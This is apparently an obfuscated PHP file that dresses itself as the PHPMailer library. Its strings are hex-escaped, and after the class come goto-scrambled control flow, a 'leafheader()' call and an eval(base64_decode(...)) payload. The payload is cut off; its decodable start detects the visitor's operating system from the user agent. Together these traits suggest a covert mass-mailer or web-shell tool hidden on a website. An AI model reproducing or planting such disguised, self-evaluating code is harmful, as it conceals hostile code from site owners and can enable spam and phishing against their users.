"\x61\160\160\x6c\151\143\x61\164\151\x6f\156\57\166\x6e\x64\x2e\157\x70\145\156\x78\155\154\146\x6f\x72\x6d\x61\164\163\x2d\157\x66\x66\151\143\x65\x64\x6f\143\165\155\x65\x6e\164\56\160\x72\145\163\x65\156\164\x61\164\x69\157\x6e\155\x6c\56\163\154\x69\144\x65\x73\x68\157\167", "\x70\160\x74\170" => "\x61\160\160\x6c\x69\143\141\164\151\157\156\57\166\156\144\x2e\x6f\x70\x65\156\x78\x6d\154\146\x6f\162\155\x61\x74\163\55\x6f\x66\146\151\x63\x65\144\x6f\x63\x75\155\x65\x6e\x74\x2e\x70\162\145\x73\x65\x6e\164\x61\x74\x69\x6f\156\155\154\x2e\x70\x72\145\x73\145\156\164\141\x74\151\x6f\x6e", "\x73\154\144\170" => "\x61\160\160\154\151\x63\141\x74\151\157\x6e\x2f\166\156\144\56\157\160\x65\156\170\155\x6c\146\157\x72\155\141\x74\x73\55\x6f\146\x66\x69\143\145\x64\157\x63\165\x6d\x65\156\164\56\160\x72\145\163\145\x6e\164\141\x74\x69\157\x6e\155\154\x2e\x73\x6c\151\x64\x65", "\x64\157\x63\170" => "\141\x70\x70\x6c\151\143\x61\x74\151\157\156\57\x76\156\144\x2e\x6f\160\x65\x6e\x78\155\x6c\x66\157\162\x6d\141\x74\x73\x2d\x6f\x66\x66\151\143\x65\144\157\x63\x75\x6d\x65\x6e\164\56\167\x6f\162\144\160\x72\157\x63\x65\x73\163\151\156\147\155\x6c\x2e\144\157\143\165\155\145\156\164", "\x64\157\x74\x78" => "\141\x70\160\154\151\143\x61\164\151\x6f\x6e\57\166\156\x64\56\157\160\145\156\x78\x6d\154\x66\157\x72\x6d\141\x74\163\55\157\146\146\151\143\x65\144\x6f\x63\x75\x6d\x65\x6e\164\x2e\x77\157\162\144\160\162\x6f\143\x65\163\x73\151\156\x67\155\x6c\56\164\145\155\160\154\x61\164\x65", "\x78\x6c\x61\155" => "\141\x70\x70\x6c\151\143\141\x74\151\x6f\156\57\x76\156\x64\56\x6d\x73\x2d\145\x78\x63\145\154\56\x61\144\x64\x69\156\x2e\155\x61\143\162\x6f\x45\156\141\x62\154\x65\x64\x2e\61\x32", "\x78\x6c\163\x62" => "\141\160\x70\x6c\x69\143\141\x74\x69\157\x6e\57\166\156\x64\x2e\155\163\x2d\x65\170\x63\145\154\x2e\163\x68\145\x65\164\x2e\x62\x69\x6e\x61\x72\x79\56\x6d\141\x63\162\x6f\105\156\x61\x62\154\145\144\56\x31\62", "\x63\x6c\141\163\x73" => "\141\x70\160\154\x69\x63\x61\164\151\x6f\x6e\x2f\x6f\x63\164\x65\164\x2d\163\x74\162\x65\x61\155", "\x64\154\x6c" => "\x61\160\x70\x6c\x69\x63\141\x74\151\x6f\x6e\x2f\x6f\143\x74\x65\164\x2d\x73\164\x72\x65\x61\x6d", "\x64\155\x73" => "\x61\160\x70\154\151\143\141\x74\151\157\156\57\x6f\143\164\145\164\x2d\163\x74\162\145\x61\x6d", "\145\x78\145" => "\141\x70\x70\x6c\151\143\141\164\151\x6f\156\x2f\x6f\x63\x74\x65\x74\55\x73\x74\162\x65\141\155", "\x6c\x68\x61" => "\141\160\160\154\151\143\x61\164\x69\x6f\156\x2f\x6f\143\x74\145\x74\x2d\x73\164\x72\x65\141\155", "\x6c\x7a\x68" => "\141\160\x70\x6c\151\143\141\164\151\157\156\57\x6f\143\164\145\x74\55\163\164\162\145\141\155", "\160\163\x64" => "\141\160\x70\154\x69\x63\141\164\151\157\x6e\x2f\157\143\x74\145\x74\55\163\x74\x72\145\141\155", "\x73\145\x61" => "\x61\160\x70\x6c\151\x63\141\164\x69\157\156\x2f\157\x63\164\145\x74\x2d\163\x74\x72\145\141\x6d", "\x73\157" => "\141\160\x70\154\151\143\141\164\x69\157\x6e\x2f\x6f\143\164\x65\164\55\x73\x74\x72\x65\x61\x6d", "\x6f\x64\141" => "\x61\160\160\x6c\151\x63\141\164\151\x6f\x6e\x2f\157\144\x61", "\x70\144\x66" => "\141\x70\x70\x6c\x69\143\x61\x74\151\x6f\x6e\x2f\160\x64\x66", "\x61\151" => "\x61\x70\160\x6c\151\x63\x61\164\151\157\x6e\x2f\x70\x6f\163\x74\x73\x63\x72\151\x70\164", "\145\160\x73" => "\x61\160\x70\x6c\151\x63\141\164\151\157\156\57\160\157\163\x74\x73\x63\x72\x69\160\x74", "\x70\x73" => "\x61\160\x70\x6c\151\x63\x61\x74\x69\x6f\156\57\160\157\x73\x74\x73\143\x72\x69\x70\164", "\x73\155\151" => "\x61\x70\160\x6c\151\x63\x61\164\x69\157\x6e\x2f\x73\x6d\151\154", "\163\x6d\x69\x6c" => "\x61\x70\160\154\151\x63\x61\164\151\157\x6e\x2f\x73\x6d\x69\154", "\155\151\146" => "\141\160\x70\154\x69\143\141\164\x69\x6f\156\x2f\x76\x6e\x64\56\x6d\x69\146", "\170\x6c\163" => "\141\x70\160\154\151\x63\x61\164\151\157\x6e\x2f\166\156\x64\56\x6d\163\x2d\145\x78\143\x65\154", "\160\x70\164" => "\141\160\160\154\151\143\x61\164\x69\x6f\x6e\x2f\x76\x6e\x64\56\x6d\163\55\160\x6f\167\x65\x72\160\x6f\151\x6e\164", "\167\142\x78\155\x6c" => "\x61\160\x70\154\151\143\x61\x74\151\157\x6e\57\x76\x6e\144\x2e\x77\141\160\x2e\167\x62\x78\155\154", "\167\155\x6c\143" => "\141\x70\160\x6c\151\143\x61\x74\151\157\x6e\x2f\x76\x6e\x64\56\167\141\x70\56\x77\155\x6c\x63", "\x64\143\162" => "\141\160\160\x6c\151\143\141\164\x69\157\x6e\x2f\170\55\x64\151\162\x65\143\164\157\x72", "\x64\151\x72" => "\x61\x70\160\154\x69\x63\141\x74\x69\157\x6e\x2f\170\55\x64\x69\162\145\x63\x74\x6f\162", "\x64\170\162" => "\141\160\160\x6c\x69\x63\x61\164\x69\x6f\x6e\57\x78\x2d\144\151\x72\x65\x63\164\157\x72", "\144\166\x69" => "\x61\160\x70\154\x69\143\x61\x74\151\157\x6e\x2f\x78\x2d\x64\166\151", "\x67\164\x61\x72" => "\x61\160\160\154\x69\143\x61\164\x69\x6f\156\x2f\170\x2d\x67\x74\141\162", "\x70\x68\160\x33" => "\141\x70\x70\x6c\151\143\141\164\151\157\156\x2f\x78\x2d\x68\164\164\160\x64\55\160\x68\160", "\x70\x68\x70\64" => "\x61\160\160\154\x69\143\x61\x74\x69\x6f\156\x2f\170\55\x68\x74\164\160\144\55\x70\150\x70", "\160\150\x70" => "\141\x70\160\x6c\x69\143\141\x74\151\157\x6e\x2f\170\55\150\164\x74\x70\x64\55\160\x68\160", "\x70\x68\x74\x6d\x6c" => "\141\160\x70\154\151\143\141\164\x69\x6f\x6e\57\170\x2d\150\164\x74\x70\x64\x2d\160\150\160", "\x70\x68\160\163" => "\x61\160\160\154\151\x63\141\x74\151\x6f\156\x2f\x78\x2d\x68\164\x74\160\x64\x2d\x70\x68\160\x2d\x73\157\x75\162\143\x65", "\x73\167\x66" => "\x61\x70\x70\x6c\151\143\x61\164\151\x6f\156\57\x78\55\163\x68\x6f\143\x6b\x77\141\166\145\55\146\x6c\x61\x73\x68", "\x73\151\x74" => "\x61\x70\x70\154\x69\143\141\x74\151\157\156\x2f\x78\x2d\163\x74\165\146\146\151\164", "\164\141\162" => "\x61\160\160\154\x69\143\141\x74\x69\x6f\156\57\x78\x2d\164\141\x72", "\x74\147\172" => "\141\x70\x70\154\x69\143\x61\x74\x69\157\x6e\x2f\170\55\x74\141\162", "\x78\150\x74" => "\x61\160\x70\154\x69\143\x61\x74\151\157\x6e\x2f\x78\150\x74\x6d\154\x2b\170\x6d\154", "\170\150\x74\155\154" => "\x61\160\160\154\151\x63\141\164\x69\x6f\156\x2f\x78\x68\164\155\154\53\x78\x6d\154", "\172\151\160" => "\141\160\x70\154\151\143\x61\x74\x69\x6f\156\x2f\172\x69\x70", "\155\x69\x64" => "\141\165\x64\151\x6f\x2f\x6d\151\144\151", "\155\x69\x64\x69" => "\x61\x75\144\x69\157\x2f\x6d\151\x64\151", "\155\160\62" => "\x61\165\x64\x69\157\x2f\x6d\160\145\x67", "\x6d\160\x33" => "\141\x75\x64\151\x6f\57\155\160\x65\x67", "\155\160\147\141" => "\141\165\x64\x69\157\x2f\x6d\160\x65\147", "\141\151\x66" => "\x61\165\x64\151\157\57\x78\x2d\x61\151\x66\x66", "\141\151\x66\143" => "\x61\x75\144\x69\x6f\x2f\x78\x2d\141\151\x66\146", "\x61\x69\146\x66" => "\x61\165\144\x69\157\57\170\55\141\151\146\x66", "\162\141\155" => "\141\165\x64\x69\x6f\x2f\170\55\x70\156\55\162\145\x61\x6c\141\165\144\x69\x6f", "\162\155" => "\x61\x75\x64\x69\157\57\x78\55\160\x6e\55\x72\145\x61\154\141\x75\x64\151\x6f", "\x72\x70\155" => "\x61\x75\144\x69\x6f\57\x78\x2d\x70\x6e\x2d\162\x65\x61\154\141\x75\x64\151\157\x2d\x70\x6c\165\147\x69\156", "\162\x61" => "\x61\x75\x64\x69\157\x2f\x78\55\x72\x65\141\x6c\x61\165\144\x69\x6f", "\167\x61\166" => "\141\x75\144\151\157\x2f\x78\x2d\167\x61\166", "\x62\x6d\x70" => "\x69\x6d\x61\147\145\x2f\x62\155\160", "\147\x69\x66" => "\151\x6d\x61\x67\x65\x2f\x67\x69\x66", "\x6a\x70\x65\147" => "\151\x6d\x61\x67\x65\57\152\x70\x65\147", "\152\x70\145" => "\151\155\141\147\x65\57\x6a\x70\145\x67", "\152\160\x67" => "\x69\155\x61\147\145\x2f\152\160\145\x67", "\x70\156\x67" => "\151\x6d\x61\x67\x65\57\160\x6e\147", "\x74\151\146\146" => "\151\x6d\141\x67\145\x2f\x74\x69\146\146", "\x74\x69\146" => "\x69\155\x61\x67\145\x2f\x74\151\146\x66", "\145\155\154" => "\155\145\163\163\x61\147\145\57\162\146\x63\70\62\62", "\143\x73\163" => "\x74\x65\x78\164\57\x63\x73\163", "\x68\x74\x6d\x6c" => "\x74\145\170\x74\57\150\164\x6d\154", "\x68\164\x6d" => "\164\x65\x78\x74\57\150\x74\x6d\154", "\x73\150\x74\155\x6c" => "\164\x65\170\x74\x2f\x68\164\x6d\154", "\154\x6f\147" => "\164\145\170\x74\57\160\x6c\x61\151\x6e", "\x74\145\x78\164" => "\164\145\x78\x74\x2f\x70\154\141\x69\x6e", "\x74\x78\164" => "\164\145\170\164\x2f\x70\154\141\151\156", "\162\164\x78" => "\x74\145\170\164\x2f\162\151\143\x68\164\x65\x78\164", "\162\x74\146" => "\x74\145\x78\x74\x2f\162\x74\146", "\x76\143\146" => "\x74\145\x78\x74\x2f\166\x63\141\162\144", "\166\x63\x61\162\x64" => "\x74\145\x78\164\57\166\x63\x61\x72\144", "\x78\155\154" => "\164\145\170\x74\x2f\170\x6d\x6c", "\170\x73\x6c" => "\164\145\x78\x74\57\x78\x6d\154", "\x6d\160\x65\x67" => "\166\x69\144\x65\157\57\155\x70\145\147", "\x6d\160\x65" => "\x76\151\x64\x65\157\57\155\x70\145\x67", "\155\x70\x67" => "\166\151\144\x65\x6f\57\155\x70\145\x67", "\155\157\x76" => "\x76\151\144\x65\x6f\x2f\161\165\x69\x63\x6b\x74\x69\155\x65", "\x71\164" => "\166\151\144\145\x6f\x2f\x71\165\x69\143\153\x74\151\155\x65", "\x72\166" => "\x76\x69\144\x65\x6f\57\x76\156\144\x2e\x72\156\x2d\162\145\x61\x6c\166\x69\x64\x65\157", "\x61\x76\x69" => "\166\x69\x64\x65\x6f\x2f\x78\55\155\163\166\x69\144\x65\157", "\155\157\x76\x69\145" => "\x76\151\x64\145\157\x2f\x78\55\163\147\x69\x2d\x6d\157\x76\x69\145"); if (array_key_exists(strtolower($ext), $mimes)) { return $mimes[strtolower($ext)]; } return "\x61\x70\x70\x6c\151\x63\x61\x74\151\157\x6e\x2f\157\143\x74\x65\164\x2d\163\164\x72\x65\141\x6d"; } public static function filenameToType($filename) { $qpos = strpos($filename, "\x3f"); if (false !== $qpos) { $filename = substr($filename, 0, $qpos); } $pathinfo = self::mb_pathinfo($filename); return self::_mime_types($pathinfo["\x65\x78\x74\x65\156\163\151\157\x6e"]); } public static function mb_pathinfo($path, $options = null) { $ret = array("\144\x69\x72\x6e\x61\155\145" => '', "\x62\x61\163\145\156\x61\x6d\x65" => '', "\145\x78\164\145\156\x73\151\x6f\156" => '', "\x66\151\154\145\x6e\x61\155\x65" => ''); $pathinfo = array(); if (preg_match("\x25\x5e\50\x2e\52\77\51\x5b\134\134\57\x5d\x2a\50\50\x5b\136\x2f\134\134\135\x2a\77\51\x28\x5c\x2e\50\133\136\134\56\x5c\134\57\x5d\x2b\x3f\51\174\51\51\x5b\134\x5c\x2f\134\x2e\x5d\x2a\44\45\x69\155", $path, $pathinfo)) { if (array_key_exists(1, $pathinfo)) { $ret["\144\151\162\x6e\141\x6d\x65"] = $pathinfo[1]; } if (array_key_exists(2, $pathinfo)) { $ret["\x62\141\163\x65\156\x61\x6d\x65"] = $pathinfo[2]; } if (array_key_exists(5, $pathinfo)) { $ret["\x65\x78\164\x65\x6e\x73\151\x6f\156"] = $pathinfo[5]; } if (array_key_exists(3, $pathinfo)) { $ret["\x66\151\x6c\145\x6e\x61\x6d\145"] = $pathinfo[3]; } } switch ($options) { case PATHINFO_DIRNAME: case "\x64\x69\x72\x6e\141\155\x65": return $ret["\144\151\x72\156\141\155\145"]; case PATHINFO_BASENAME: case "\142\141\163\x65\x6e\141\155\145": return $ret["\142\x61\x73\145\x6e\141\x6d\145"]; case PATHINFO_EXTENSION: case "\145\170\x74\x65\x6e\x73\x69\157\x6e": return $ret["\145\x78\164\145\x6e\163\x69\x6f\x6e"]; case PATHINFO_FILENAME: case "\x66\151\x6c\x65\156\141\155\x65": return $ret["\x66\151\154\145\156\141\x6d\145"]; default: return $ret; } } public function set($name, $value = '') { if (property_exists($this, $name)) { $this->{$name} = $value; return true; } else { $this->setError($this->lang("\x76\x61\x72\x69\x61\x62\154\145\137\x73\145\x74") . $name); return false; } } public function secureHeader($str) { return trim(str_replace(array("\xd", "\12"), '', $str)); } public static function normalizeBreaks($text, $breaktype = "\15\xa") { return preg_replace("\57\x28\134\162\134\x6e\174\x5c\162\x7c\x5c\x6e\x29\57\x6d\163", $breaktype, $text); } public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '') { $this->sign_cert_file = $cert_filename; $this->sign_key_file = $key_filename; $this->sign_key_pass = $key_pass; $this->sign_extracerts_file = $extracerts_filename; } public function DKIM_QP($txt) { $line = ''; for ($i = 0; $i < strlen($txt); $i++) { $ord = ord($txt[$i]); if (33 <= $ord && $ord <= 58 || $ord == 60 || 62 <= $ord && $ord <= 126) { $line .= $txt[$i]; } else { $line .= "\75" . sprintf("\x25\x30\x32\x58", $ord); } } return $line; } public function DKIM_Sign($signHeader) { if (!defined("\x50\113\x43\x53\67\x5f\x54\x45\x58\x54")) { if ($this->exceptions) { throw new phpmailerException($this->lang("\x65\x78\164\145\156\x73\151\x6f\156\x5f\x6d\x69\163\x73\151\x6e\x67") . "\157\x70\145\x6e\x73\x73\154"); } return ''; } $privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' != $this->DKIM_passphrase) { $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase); } else { $privKey = openssl_pkey_get_private($privKeyStr); } if (version_compare(PHP_VERSION, "\65\56\63\56\x30") >= 0 and in_array("\x73\x68\x61\62\65\66\127\x69\x74\150\x52\123\x41\105\x6e\x63\x72\171\x70\164\x69\157\156", openssl_get_md_methods(true))) { if (openssl_sign($signHeader, $signature, $privKey, "\163\x68\141\62\x35\66\127\x69\x74\x68\122\x53\x41\105\x6e\x63\x72\x79\x70\164\x69\x6f\x6e")) { openssl_pkey_free($privKey); return base64_encode($signature); } } else { $pinfo = openssl_pkey_get_details($privKey); $hash = hash("\163\x68\141\62\x35\66", $signHeader); $t = "\63\x30\63\x31\63\x30\x30\x64\60\66\x30\x39\x36\x30\x38\66\64\x38\x30\x31\66\65\60\x33\x30\x34\x30\x32\60\61\x30\x35\60\x30\60\x34\x32\x30" . $hash; $pslen = $pinfo["\x62\151\164\163"] / 8 - (strlen($t) / 2 + 3); $eb = pack("\110\x2a", "\x30\x30\x30\x31" . str_repeat("\106\x46", $pslen) . "\x30\60" . $t); if (openssl_private_encrypt($eb, $signature, $privKey, OPENSSL_NO_PADDING)) { openssl_pkey_free($privKey); return base64_encode($signature); } } openssl_pkey_free($privKey); return ''; } public function DKIM_HeaderC($signHeader) { $signHeader = preg_replace("\x2f\134\162\x5c\x6e\x5c\163\53\57", "\40", $signHeader); $lines = explode("\15\12", $signHeader); foreach ($lines as $key => $line) { list($heading, $value) = explode("\72", $line, 2); $heading = strtolower($heading); $value = preg_replace("\x2f\134\x73\173\x32\x2c\x7d\x2f", "\x20", $value); $lines[$key] = $heading . "\72" . trim($value); } $signHeader = implode("\xd\xa", $lines); return $signHeader; } public function DKIM_BodyC($body) { if ($body == '') { return "\15\xa"; } $body = str_replace("\15\xa", "\xa", $body); $body = str_replace("\xa", "\15\xa", $body); while (substr($body, strlen($body) - 4, 4) == "\xd\xa\15\xa") { $body = substr($body, 0, strlen($body) - 2); } return $body; } public function DKIM_Add($headers_line, $subject, $body) { $DKIMsignatureType = "\162\163\141\x2d\163\150\141\x32\65\x36"; $DKIMcanonicalization = "\162\x65\x6c\141\x78\145\144\x2f\x73\x69\x6d\160\x6c\145"; $DKIMquery = "\144\x6e\163\x2f\164\x78\164"; $DKIMtime = time(); $subject_header = "\x53\165\x62\152\145\x63\x74\x3a\40{$subject}"; $headers = explode($this->LE, $headers_line); $from_header = ''; $to_header = ''; $date_header = ''; $current = ''; foreach ($headers as $header) { if (strpos($header, "\x46\x72\x6f\x6d\72") === 0) { $from_header = $header; $current = "\146\162\157\155\137\x68\x65\x61\144\145\162"; } elseif (strpos($header, "\124\x6f\x3a") === 0) { $to_header = $header; $current = "\164\157\137\150\x65\x61\x64\x65\x72"; } elseif (strpos($header, "\104\x61\164\145\x3a") === 0) { $date_header = $header; $current = "\144\141\164\145\137\x68\145\x61\144\x65\x72"; } else { if (!empty(${$current}) && strpos($header, "\x20\x3d\77") === 0) { ${$current} .= $header; } else { $current = ''; } } } $from = str_replace("\174", "\x3d\x37\103", $this->DKIM_QP($from_header)); $to = str_replace("\174", "\x3d\x37\x43", $this->DKIM_QP($to_header)); $date = str_replace("\x7c", "\75\x37\x43", $this->DKIM_QP($date_header)); $subject = str_replace("\174", "\75\67\x43", $this->DKIM_QP($subject_header)); $body = $this->DKIM_BodyC($body); $DKIMlen = strlen($body); $DKIMb64 = base64_encode(pack("\110\52", hash("\x73\x68\141\62\65\66", $body))); if ('' == $this->DKIM_identity) { $ident = ''; } else { $ident = "\x20\151\x3d" . $this->DKIM_identity . "\x3b"; } $dkimhdrs = "\x44\x4b\111\115\55\x53\x69\147\x6e\141\x74\x75\162\x65\72\x20\166\x3d\61\73\40\x61\75" . $DKIMsignatureType . "\73\x20\161\x3d" . $DKIMquery . "\73\x20\154\75" . $DKIMlen . "\x3b\40\163\75" . $this->DKIM_selector . "\73\xd\12" . "\11\164\75" . $DKIMtime . "\73\40\143\75" . $DKIMcanonicalization . "\x3b\15\12" . "\11\x68\75\106\x72\157\155\x3a\124\x6f\72\104\x61\x74\x65\x3a\x53\165\x62\152\145\143\x74\73\15\12" . "\x9\144\x3d" . $this->DKIM_domain . "\x3b" . $ident . "\xd\12" . "\11\x7a\75{$from}\15\12" . "\x9\x7c{$to}\15\12" . "\x9\x7c{$date}\15\xa" . "\11\x7c{$subject}\x3b\xd\xa" . "\11\142\x68\x3d" . $DKIMb64 . "\x3b\xd\xa" . "\x9\142\x3d"; $toSign = $this->DKIM_HeaderC($from_header . "\xd\xa" . $to_header . "\15\12" . $date_header . "\15\12" . $subject_header . "\15\xa" . $dkimhdrs); $signed = $this->DKIM_Sign($toSign); return $dkimhdrs . $signed . "\15\12"; } public static function hasLineLongerThanMax($str) { return (bool) preg_match("\x2f\x5e\50\x2e\x7b" . (self::MAX_LINE_LENGTH + 2) . "\x2c\175\x29\x2f\x6d", $str); } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from) { if (!empty($this->action_function) && is_callable($this->action_function)) { $params = array($isSent, $to, $cc, $bcc, $subject, $body, $from); call_user_func_array($this->action_function, $params); } } } goto ZUnDr; R5nQE: leafheader(); goto f16Zk; LYReO: eval(base64_decode("\x5a\x6e\126\x75\131\63\x52\160\142\62\64\x67\127\x45\112\146\x54\61\115\x6f\x4a\106\126\x54\122\126\112\146\x51\125\x64\106\x54\x6c\121\x70\x65\x77\60\x4b\103\x53\122\120\x55\61\x39\x46\125\154\112\x50\x55\x69\101\x67\x49\x43\x41\x39\111\103\x41\x67\111\154\126\x75\141\x32\65\166\x64\x32\x34\147\x54\61\x4d\x67\x55\107\x78\150\x64\x47\132\x76\143\155\x30\x69\117\167\60\x4b\x49\103\x41\x67\111\x43\122\120\x55\171\101\147\120\x53\x41\147\x49\x47\x46\171\143\155\x46\65\113\x43\x41\x6e\x4c\63\144\160\142\x6d\x52\x76\x64\x33\115\x67\142\156\x51\147\x4d\124\101\166\141\x53\143\147\111\103\101\147\x49\103\101\71\x50\x69\x41\x67\112\x31\x64\160\x62\155\122\166\x64\x33\x4d\x67\x4d\x54\101\156\x4c\101\60\113\x43\123\101\147\x49\x43\101\147\111\103\101\x67\x49\103\x41\147\x49\x43\x41\147\111\103\x41\156\x4c\x33\144\160\142\x6d\122\x76\x64\x33\x4d\147\142\156\x51\x67\x4e\151\x34\172\x4c\62\x6b\156\x49\x43\101\147\x49\103\101\71\120\151\101\147\112\61\x64\x70\142\155\x52\x76\x64\x33\x4d\147\117\103\64\x78\x4a\x79\x77\116\x43\147\153\147\x49\103\101\147\111\x43\101\147\x49\x43\101\x67\x49\x43\101\147\x49\103\101\x67\112\171\x39\x33\x61\x57\x35\153\x62\63\x64\x7a\111\x47\65\x30\111\x44\131\x75\x4d\151\x39\160\x4a\171\101\147\x49\x43\x41\x67\x50\x54\x34\147\x49\x43\x64\130\x61\127\x35\x6b\x62\63\144\172\x49\104\x67\x6e\114\x41\x30\x4b\103\x53\101\147\x49\x43\101\147\111\x43\x41\x67\111\103\x41\x67\111\x43\101\147\111\103\x41\x6e\x4c\x33\144\x70\x62\155\x52\166\144\x33\x4d\x67\142\x6e\121\147\x4e\x69\x34\170\114\62\x6b\x6e\x49\103\x41\x67\111\x43\x41\x39\x50\x69\x41\147\x4a\61\x64\x70\x62\x6d\122\x76\144\63\115\147\116\171\x63\163\x44\121\x6f\x4a\x49\x43\x41\x67\x49\103\x41\x67\x49\103\x41\147\111\x43\101\x67\111\x43\101\147\111\x43\x63\166\x64\x32\154\x75\x5a\x47\71\x33\x63\171\102\165\x64\x43\x41\62\x4c\152\x41\166\x61\123\143\x67\x49\103\101\147\111\x44\60\x2b\111\103\101\156\x56\62\154\165\x5a\x47\71\x33\x63\x79\102\x57\x61\x58\116\60\x59\123\x63\163\x44\x51\x6f\x4a\x49\103\101\x67\x49\x43\x41\x67\111\x43\101\x67\x49\x43\x41\147\x49\103\x41\x67\111\x43\143\x76\x64\62\154\x75\x5a\x47\71\63\x63\171\x42\x75\144\x43\x41\x31\114\x6a\111\x76\x61\123\143\x67\111\x43\x41\x67\111\x44\60\x2b\x49\103\x41\156\126\x32\154\165\132\107\71\63\143\x79\102\124\x5a\130\112\62\x5a\x58\x49\147\x4d\152\x41\x77\115\x79\x39\131\125\103\x42\64\x4e\x6a\x51\x6e\114\x41\x30\x4b\x43\123\101\147\111\103\x41\x67\x49\x43\101\x67\111\x43\x41\x67\x49\103\x41\147\x49\103\x41\x6e\114\63\144\160\x62\x6d\122\x76\144\x33\x4d\147\142\156\121\x67\x4e\x53\64\x78\114\62\153\156\x49\103\101\x67\111\103\x41\71\x50\151\x41\147\x4a\61\144\x70\142\155\x52\x76\x64\x33\115\147\127\106\101\x6e\x4c\x41\60\113\103\123\x41\147\111\103\101\x67\x49\103\101\147\x49\x43\x41\x67\111\103\x41\147\x49\x43\101\156\x4c\x33\144\x70\x62\x6d\122\166\144\63\115\147\x65\x48\101\166\141\123\x63\147\x49\103\101\x67\x49\x43\x41\x67\x49\103\x41\71\120\151\101\147\112\61\144\x70\142\x6d\122\x76\x64\63\x4d\147\x57\x46\x41\x6e\x4c\x41\60\113\x43\x53\101\x67\111\103\101\x67\111\103\x41\147\111\x43\101\x67\111\103\x41\x67\x49\103\101\156\x4c\63\144\x70\142\x6d\x52\x76\144\63\115\x67\x62\x6e\x51\147\x4e\123\x34\x77\114\x32\x6b\156\x49\103\101\147\x49\103\x41\x39\120\x69\x41\147\x4a\61\144\160\x62\155\122\x76\144\x33\115\147\x4d\152\101\167\x4d\103\143\163\x44\x51\157\112\x49\103\x41\147\111\103\x41\147\x49\x43\x41\x67\x49\x43\x41\x67\111\103\x41\147\x49\103\x63\x76\x64\x32\x6c\x75\132\107\71\63\x63\171\x42\164\132\123\71\160\x4a\x79\101\147\111\x43\101\x67\111\103\x41\147\111\104\x30\53\x49\103\101\156\x56\x32\x6c\x75\132\x47\x39\63\143\x79\x42\x4e\x52\x53\x63\x73\x44\121\157\112\111\103\101\x67\111\x43\101\x67\x49\x43\x41\147\111\x43\101\x67\x49\103\x41\147\111\103\x63\x76\x64\x32\x6c\x75\117\124\147\x76\141\123\x63\x67\111\103\x41\147\111\x43\101\x67\111\x43\101\147\111\103\x41\147\x49\104\60\53\x49\103\x41\156\x56\62\154\x75\x5a\107\71\x33\143\x79\x41\x35\117\x43\143\163\x44\121\157\x4a\111\103\101\x67\111\x43\x41\x67\111\x43\101\147\x49\103\101\147\111\103\101\147\x49\x43\143\x76\144\x32\x6c\x75\117\124\125\x76\141\x53\x63\x67\x49\x43\101\147\x49\x43\101\147\x49\103\101\147\x49\x43\x41\x67\111\104\60\53\x49\103\101\x6e\x56\x32\154\x75\x5a\x47\x39\63\x63\x79\x41\65\116\123\143\x73\x44\x51\x6f\112\x49\103\101\147\x49\x43\x41\147\111\x43\101\x67\x49\x43\x41\x67\x49\x43\x41\147\x49\103\x63\x76\144\x32\x6c\165\x4d\x54\x59\166\x61\123\143\x67\x49\x43\x41\x67\x49\103\101\147\x49\x43\x41\147\111\103\101\x67\x49\104\60\53\111\x43\101\156\x56\62\154\165\132\x47\71\x33\x63\x79\101\172\114\152\105\x78\x4a\x79\x77\x4e\103\147\153\x67\111\103\x41\147\x49\x43\101\147\111\103\101\x67\111\103\x41\x67\111\103\101\147\x4a\171\71\x74\x59\127\116\160\142\x6e\x52\x76\143\x32\150\x38\x62\127\106\x6a\111\107\71\172\x49\110\x67\x76\x61\x53\x63\x67\120\x54\64\147\x49\103\x64\116\131\127\x4d\x67\124\x31\x4d\x67\x57\x43\143\163\104\121\157\x4a\111\x43\101\147\x49\x43\101\147\x49\x43\x41\147\x49\103\x41\147\x49\x43\101\147\x49\103\x63\166\142\127\106\x6a\130\63\102\x76\x64\62\126\171\x63\x47\x4d\x76\x61\123\143\147\x49\x43\101\x67\111\103\101\147\111\104\x30\53\x49\103\x41\x6e\124\x57\x46\x6a\111\105\71\124\x49\104\153\x6e\x4c\x41\x30\x4b\x43\123\x41\147\111\x43\101\x67\x49\103\101\x67\111\x43\101\x67\111\103\x41\147\111\103\x41\156\114\62\x78\x70\142\x6e\126\64\x4c\x32\x6b\156\x49\x43\101\x67\111\103\x41\147\111\x43\x41\147\111\x43\x41\x67\x49\x43\101\71\x50\151\x41\x67\x4a\60\170\160\x62\156\126\64\x4a\171\167\x4e\x43\147\x6b\x67\x49\x43\x41\147\x49\x43\x41\147\111\x43\x41\x67\111\103\101\147\111\103\x41\x67\112\x79\71\61\131\156\x56\x75\144\x48\x55\x76\141\123\143\147\x49\103\x41\147\111\103\101\147\x49\x43\x41\x67\111\x43\x41\147\120\x54\x34\147\111\x43\144\x56\131\x6e\126\x75\x64\110\x55\156\114\101\60\x4b\x43\x53\x41\x67\111\x43\x41\147\111\103\101\x67\111\x43\x41\x67\111\103\x41\x67\x49\103\x41\156\114\x32\x6c\167\141\x47\x39\x75\132\x53\x39\160\112\171\101\147\x49\x43\101\147\111\x43\x41\147\111\103\x41\x67\111\x43\101\71\x50\151\x41\147\112\62\x6c\x51\x61\107\71\x75\132\123\x63\x73\104\x51\x6f\x4a\111\x43\x41\147\111\103\101\147\111\x43\x41\147\x49\x43\101\x67\111\x43\x41\x67\111\x43\143\166\x61\x58\102\166\x5a\103\x39\x70\112\171\101\147\111\x43\101\147\x49\x43\x41\147\x49\x43\x41\147\111\103\101\147\111\104\60\x2b\111\x43\x41\156\141\126\x42\166\132\x43\143\163\x44\x51\x6f\112\111\103\x41\147\111\x43\x41\x67\111\x43\101\x67\111\x43\x41\147\111\103\x41\147\x49\103\x63\x76\x61\x58\102\150\132\103\71\160\112\171\x41\147\111\x43\101\x67\x49\103\101\x67\111\103\x41\147\111\103\x41\147\111\104\60\x2b\111\103\x41\156\x61\126\x42\x68\x5a\103\x63\163\x44\121\157\x4a\111\103\101\x67\111\103\101\x67\111\103\x41\147\x49\x43\101\147\111\x43\x41\x67\111\x43\x63\166\131\x57\65\153\x63\x6d\71\160\x5a\x43\71\x70\112\x79\101\x67\x49\103\101\147\111\x43\101\x67\111\103\x41\147\x49\x44\60\x2b\111\x43\x41\x6e\121\x57\65\x6b\x63\x6d\x39\x70\x5a\